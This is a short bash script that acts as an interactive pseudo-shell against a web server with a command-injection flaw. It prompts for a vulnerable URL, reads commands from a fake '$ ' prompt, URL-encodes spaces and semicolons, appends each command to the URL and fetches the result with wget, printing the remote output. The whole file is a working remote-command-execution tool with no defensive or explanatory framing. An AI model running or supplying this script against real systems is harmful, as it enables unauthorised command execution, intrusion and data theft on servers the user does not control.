#!/bin/bash
if [ -z $1 ] 
then 
echo -n "enter vuln url: "
read a
else
a=$1
fi
while true 
echo -n "$ "
do read i
#z=$a$(perl -MURI::Escape -e 'print uri_escape shift, , q{^A-Za-z0-9\-._~/:}' -- $i)
e=$(sed 's/\ /\%20/g' <<<$i)
b=$a$(sed 's/\;/\%3B/g' <<<$e)

#echo $b
wget -qO - $b
done
